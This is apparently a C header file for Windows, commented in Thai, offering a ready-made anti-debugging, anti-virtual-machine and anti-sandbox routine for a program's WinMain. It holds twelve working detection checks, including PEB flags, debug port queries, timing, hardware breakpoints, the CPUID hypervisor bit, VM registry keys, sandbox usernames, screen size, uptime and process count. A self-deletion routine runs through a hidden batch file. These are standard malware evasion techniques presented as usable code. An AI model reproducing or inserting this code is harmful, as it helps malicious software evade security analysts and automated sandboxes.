#pragma once
#include <windows.h>
#include <intrin.h>

// ── Anti-Debug / Anti-VM / Anti-Sandbox ──────────────────────
// เรียก AntiAll() ตอนต้น WinMain ก่อนทำอะไร

// ── 1. IsDebuggerPresent (PEB flag) ──────────────────────────
static BOOL _chk_peb(void){
    return IsDebuggerPresent();
}

// ── 2. NtQueryInformationProcess (ProcessDebugPort) ──────────
typedef NTSTATUS(WINAPI*pfNQ)(HANDLE,UINT,PVOID,ULONG,PULONG);
static BOOL _chk_dbgport(void){
    HMODULE hn=GetModuleHandleA("ntdll.dll");
    pfNQ NtQIP=(pfNQ)GetProcAddress(hn,"NtQueryInformationProcess");
    if(!NtQIP)return FALSE;
    DWORD_PTR port=0;
    NtQIP(GetCurrentProcess(),7,&port,sizeof(port),NULL);
    return port!=0;
}

// ── 3. CheckRemoteDebuggerPresent ────────────────────────────
static BOOL _chk_remote(void){
    BOOL dbg=FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(),&dbg);
    return dbg;
}

// ── 4. Timing check (RDTSC) — debugger ทำให้ช้า ─────────────
static BOOL _chk_timing(void){
    UINT64 t1=__rdtsc();
    // nop loop
    volatile int x=0;for(int i=0;i<1000;i++) x+=i;
    UINT64 t2=__rdtsc();
    return (t2-t1)>0x100000; // เกิน threshold = มี debugger
}

// ── 5. Hardware breakpoint (DR registers via context) ─────────
static BOOL _chk_hwbp(void){
    CONTEXT ctx={0}; ctx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(),&ctx);
    return (ctx.Dr0||ctx.Dr1||ctx.Dr2||ctx.Dr3);
}

// ── 6. Heap flag check (PEB.NtGlobalFlag) ────────────────────
static BOOL _chk_heapflag(void){
#ifdef _WIN64
    BYTE*peb=(BYTE*)__readgsqword(0x60);
    DWORD ntgf=*(DWORD*)(peb+0xBC);
#else
    BYTE*peb=(BYTE*)__readfsdword(0x30);
    DWORD ntgf=*(DWORD*)(peb+0x68);
#endif
    return (ntgf&0x70)!=0; // 0x70 = heap debug flags
}

// ── 7. CPUID hypervisor bit (VM detection) ───────────────────
static BOOL _chk_vm(void){
    int info[4]={0};
    __cpuid(info,1);
    return (info[2]>>31)&1; // ECX bit31 = hypervisor present
}

// ── 8. Known VM registry keys ────────────────────────────────
static BOOL _chk_vmreg(void){
    const char*keys[]={
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
        NULL
    };
    for(int i=0;keys[i];i++){
        HKEY k;
        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,keys[i],0,KEY_READ,&k)==ERROR_SUCCESS){
            RegCloseKey(k);return TRUE;
        }
    }
    return FALSE;
}

// ── 9. Sandbox username / computername heuristics ────────────
static BOOL _chk_sandbox(void){
    const char*badusers[]={"sandbox","malware","virus","test","sample",
        "john","user","admin","administrator","analyse",NULL};
    char un[256]={0}; DWORD sz=sizeof(un); GetUserNameA(un,&sz);
    for(int i=0;un[i];i++) if(un[i]>='A'&&un[i]<='Z') un[i]+=32;
    for(int i=0;badusers[i];i++) if(strstr(un,badusers[i]))return TRUE;
    return FALSE;
}

// ── 10. Screen resolution too small (sandbox headless) ───────
static BOOL _chk_screen(void){
    return GetSystemMetrics(SM_CXSCREEN)<800||GetSystemMetrics(SM_CYSCREEN)<600;
}

// ── 11. Uptime too short (sandbox rebooted just for analysis) ─
static BOOL _chk_uptime(void){
    return GetTickCount()<(3*60*1000); // < 3 นาที
}

// ── 12. Number of running processes too few ──────────────────
#include <tlhelp32.h>
static BOOL _chk_proccount(void){
    HANDLE hs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hs==INVALID_HANDLE_VALUE)return FALSE;
    int cnt=0; PROCESSENTRY32 pe={sizeof(pe)};
    if(Process32First(hs,&pe)) do{cnt++;}while(Process32Next(hs,&pe));
    CloseHandle(hs);
    return cnt<20; // sandbox มักมี process น้อย
}

// ── 13. Self-delete on detection (evasion) ───────────────────
static void _self_delete(void){
    char self[MAX_PATH]={0},bat[MAX_PATH]={0};
    GetModuleFileNameA(NULL,self,MAX_PATH);
    GetTempPathA(MAX_PATH,bat);
    strcat_s(bat,MAX_PATH,"nz_sd.bat");
    FILE*f=fopen(bat,"w");
    if(f){
        fprintf(f,"@echo off\r\ntimeout /t 2 /nobreak >nul\r\ndel /f /q \"%s\"\r\ndel /f /q \"%%~f0\"\r\n",self);
        fclose(f);
    }
    STARTUPINFOA si={sizeof(si)};si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={0};
    char cmd[MAX_PATH+32]; snprintf(cmd,sizeof(cmd),"cmd.exe /c \"%s\"",bat);
    CreateProcessA(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess)CloseHandle(pi.hProcess);
    if(pi.hThread) CloseHandle(pi.hThread);
    ExitProcess(0);
}

// ── Master check — เรียกตอนต้น WinMain ───────────────────────
// mode: 0 = exit เงียบ ๆ, 1 = self-delete
static void AntiAll(int mode){
    BOOL det=FALSE;
    det|=_chk_peb();
    det|=_chk_dbgport();
    det|=_chk_remote();
    det|=_chk_timing();
    det|=_chk_hwbp();
    det|=_chk_heapflag();
    det|=_chk_vm();
    det|=_chk_vmreg();
    det|=_chk_sandbox();
    det|=_chk_screen();
    det|=_chk_uptime();
    det|=_chk_proccount();
    if(det){
        if(mode==1) _self_delete();
        else        ExitProcess(0);
    }
}
